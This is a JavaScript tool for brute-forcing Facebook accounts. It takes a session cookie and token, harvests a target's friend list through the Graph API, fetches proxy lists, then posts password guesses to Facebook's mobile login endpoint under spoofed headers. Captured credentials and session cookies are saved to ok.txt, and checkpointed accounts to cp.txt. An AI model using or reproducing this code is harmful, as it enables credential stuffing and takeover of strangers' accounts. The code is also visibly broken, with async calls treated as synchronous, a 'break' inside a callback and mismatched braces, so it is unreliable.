const request = require('request');
const fs = require('fs');
const readline = require('readline');

class Brute {
  constructor() {
    this.ugen = [];
    this.iid2 = [];
    this.ok = [];
    this.cp = [];
    this.loop = 0;
    this.ses = request.defaults({ jar: true });
    this.id = [];
    this.dumpId();
  }

  uaSet() {
    for (let xd = 0; xd < 1000; xd++) {
      let xx = [];
      const rr = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
      const rc = (array) => array[rr(0, array.length - 1)];
      const A = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0';
      const uaku = A;
      xx.push(uaku);
      this.ugen = rc(xx);
    }
    return this.ugen;
  }

  ngorox() {
    try {
      this.ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all', (error, response, body) => {
        if (error) {
          console.error(error);
          process.exit(1);
        }
        fs.writeFileSync('prox.txt', body);
      });
    } catch (error) {
      console.error(error);
      process.exit(1);
    }
  }

  logo() {
    if (process.platform.toLowerCase().includes('linux')) {
      try {
        console.clear();
      } catch (error) {
        // Handle any errors
      }
    } else if (process.platform.toLowerCase().includes('win')) {
      try {
        console.clear();
      } catch (error) {
        // Handle any errors
      }
    } else {
      try {
        console.clear();
      } catch (error) {
        // Handle any errors
      }
    }

    console.log(`
                   _ _       \ \\
        .-------. / \\_> /\\    |/
       /         \.'\`  \`',.--//
     -(           I      I  @@\\
       \\         /'.____.'\\___|    â•”â•¦â•—â•”â•— â•”â•â•—
        '-.....-' __/ | \\   (\`)
                 /   /  /          â•© â•©â•šâ•â•â•š
                     \\  \\    CODE BY BISHESH DRAWS
        --------------------------------------------------------
    `);
  }

  kentod(integer) {
    const lis = Array.from('1234567890');
    const gets = Array.from({ length: integer }, () => lis[Math.floor(Math.random() * lis.length)]);
    return gets.join('').toUpperCase();
  }

  ngoxok(cooz) {
    const coki = `datr=${cooz.datr};sb=${cooz.sb};locale=id_ID;c_user=${cooz.c_user};xs=${cooz.xs};fr=${cooz.fr};`;
    return coki;
  }

  metode(user, pasw, cebok) {
    const pros = fs.readFileSync('prox.txt', 'utf8').split('\n');

    for (const pw of pasw) {
      try {
        const uas = this.uaSet();
        const nip = pros[Math.floor(Math.random() * pros.length)];
        const proxs = { http: `socks5://${nip}` };
        const head = {
          Host: cebok,
          'cache-control': 'max-age=0',
          'upgrade-insecure-requests': '1',
          'user-agent': uas,
          accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'x-requested-with': 'com.ucimini.internetbrowser',
          'sec-fetch-site': 'none',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-user': '?1',
          'sec-fetch-dest': 'document',
          'accept-encoding': 'gzip, deflate',
          'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        };
        const link = this.ses.get('https://m.facebook.com/login?source=auth_switcher', { headers: head });

        const date = {
          lsd: link.text.match(/name="lsd" value="(.*?)"/)[1],
          jazoest: link.text.match(/name="jazoest" value="(.*?)"/)[1],
          email: user,
          pass: pw,
          next: 'https://m.facebook.com/login/save-device/?login_source=login#_=_'
        };
        const heaa = {
          Host: cebok,
          'x-fb-lsd': link.text.match(/name="lsd" value="(.*?)"/)[1],
          'user-agent': uas,
          'content-type': 'application/x-www-form-urlencoded',
          accept: '/',
          origin: 'https://' + cebok,
          'x-requested-with': 'com.ucimini.internetbrowser',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          referer: 'https://' + cebok + '/login?source=auth_switcher',
          'accept-encoding': 'gzip, deflate',
          'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        };
        const po = this.ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', { form: date, headers: heaa, allow_redirects: false, proxies: proxs }, (error, response, body) => {
          if (error) {
            console.error(error);
            setTimeout(() => {
              this.metode(user, pasw, cebok);
            }, 31000);
          } else {
            if (this.ses.jar.getCookieString('c_user')) {
              const digi = this.kentod(2);
              const coki = this.ngoxok(this.ses.jar.getCookies('https://' + cebok).find((cookie) => cookie.key === 'datr').value);
              const tree = require('asciitree');
              const resultTree = tree({ 'RESULTS OK': `${new Date().getDate()} ${new Date().getMonth() + 1} ${new Date().getFullYear()}` })
                .add({ [`${user}|${pw}`]: `ua=${digi}` })
                .add({ [uas]: '' });
              console.log(resultTree);
              const wrt = ` [âœ“] ${user}|${pw}|${coki}`;
              this.ok.push(wrt);
              fs.appendFileSync('ok.txt', wrt + '\n', 'utf-8');
              break;
            } else if (this.ses.jar.getCookieString('checkpoint')) {
              const tree = require('asciitree');
              const resultTree = tree({ 'RESULTS CP': `${new Date().getDate()} ${new Date().getMonth() + 1} ${new Date().getFullYear()}` })
                .add({ [`${user}|${pw}`]: '' })
                .add({ [uas]: '' });
              console.log(resultTree);
              const wrt = ` [Ã—] ${user}|${pw}`;
              this.cp.push(wrt);
              fs.appendFileSync('cp.txt', wrt + '\n', 'utf-8');
              break;
            }
          }
        });
      } catch (error) {
        setTimeout(() => {
          this.metode(user, pasw, cebok);
        }, 31000);
      }
    }
    this.loop += 1;
  }

  convert(uid) {
    if (uid === 'me') {
      return { uid: uid };
    } else {
      const regexResult = /\w+/.exec(uid);
      if (regexResult) {
        const user = regexResult[0];
        const p = this.ses.get(`https://mbasic.facebook.com/${user}?_rdr`, (error, response, body) => {
          if (error) {
            console.error(error);
            return { uid: user };
          }
          try {
            const matches = body.match(/\;rid\=(\d+)\&/);
            const userMatch = matches ? matches[1] : user;
            return { uid: userMatch };
          } catch (error) {
            console.error(error);
            return { uid: user };
          }
        });
        return { uid: p };
      }
    }
  }

  dumpId() {
    this.logo();

    try {
      const cook = { cookie: fs.readFileSync('.cokie.txt', 'utf-8') };
      const took = fs.readFileSync('.token.txt', 'utf-8');
      try {
        const ishx = this.ses.get(`https://graph.facebook.com/me?fields=name,id&access_token=${took}`, { jar: cook }, (error, response, body) => {
          if (error) {
            console.error(error);
            process.exit(1);
          }
          try {
            const ishx = JSON.parse(body);
            const nama = ishx.name;
            const idfb = ishx.id;
            console.log(`        --------------------------------------------------------
                        nama  : ${nama}
                        id fb : ${idfb}
            --------------------------------------------------------`);
          } catch (error) {
            console.error(error);
            fs.unlinkSync('.cokie.txt');
            fs.unlinkSync('.token.txt');
            console.log('\x1b[1;91m[%] Login ulang dengan akun lain.\x1b[0m');
            this.cookie();
            return;
          }
        });
      } catch (error) {
        console.error(error);
        process.exit(1);
      }

      console.log('[*] Ketik "me" jika ingin crack dari daftar teman anda.');

      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      rl.question('[*] Masukkan id atau username : ', (user) => {
        const uid = this.convert(user);
        console.log('--------------------------------------------------------');

        this.ses.get(`https://graph.facebook.com/${uid.uid}?fields=friends.fields(id,name).limit(5000)&access_token=${took}`, { jar: cook }, (error, response, body) => {
          if (error) {
            console.error(error);
            process.exit(1);
          }
          const tol = JSON.parse(body).friends.data;
          for (const x of tol) {
            this.id.push(`${x.id}<=>${x.name}`);
            const wr = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'];
            process.stdout.write(`\r[*] Sedang mengumpulkan id: ${wr}${this.id.length}\x1b[0m -> ${wr}${x.id}\x1b[0m`);
            process.stdout.flush();
            setTimeout(() => {
              return;
            }, 5);
          }

          console.log(`\n[*] Total id: ${this.id.length}`);
          this.ngorox();
          this.pilihan(this.id);
        });
      });

      rl.close();
    } catch (error) {
      this.cookie();
    }
  }

  pilihan(xx) {
    for (const ih of xx) {
      this.iid2.unshift(ih);
    }
    this.password();
  }

  password() {
    console.log(`        --------------------------------------------------------
                    PROCESSING CRACK !!! USE 
    AIRPLANE MODE TO BOOST THE RATE
    --------------------------------------------------------`);

    const bool = require('concurrently');

    bool();
  }

  loginCokie(cok) {
    this.ses.get('https://business.facebook.com/business_locations', { headers: { 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', referer: 'https://www.facebook.com', host: 'business.facebook.com', origin: 'https://business.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8' }, jar: { cookie: cok } }, (error, response, body) => {
      if (error) {
        console.error('Tidak ada koneksi internet');
        process.exit(1);
      }
      try {
        const findToken = body.match(/(EAAG\w+)/);
        const token = findToken ? findToken[1] : null;
        const nama = JSON.parse(this.ses.get(`https://graph.facebook.com/me?fields=name,id&access_token=${token}`, { jar: { cookie: cok } }).body).name;

        fs.appendFileSync('.token.txt', token, 'utf-8');
        fs.appendFileSync('.cokie.txt', cok, 'utf-8');

        console.log(`\n[âœ“] Selamat ${nama} cookie kamu valid!\n[>]:gunakan dengan bijak yah tools nya!`);
        process.exit();
      } catch (error) {
        console.error('Cookie kamu invalid');
        process.exit(1);
      }
    });
  }

  cookie() {
    this.logo();
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      rl.question('[?] Cookie: ', (ahh) => {
        this.loginCokie(ahh);
        rl.close();
      });
    }
  }
}

new Brute();
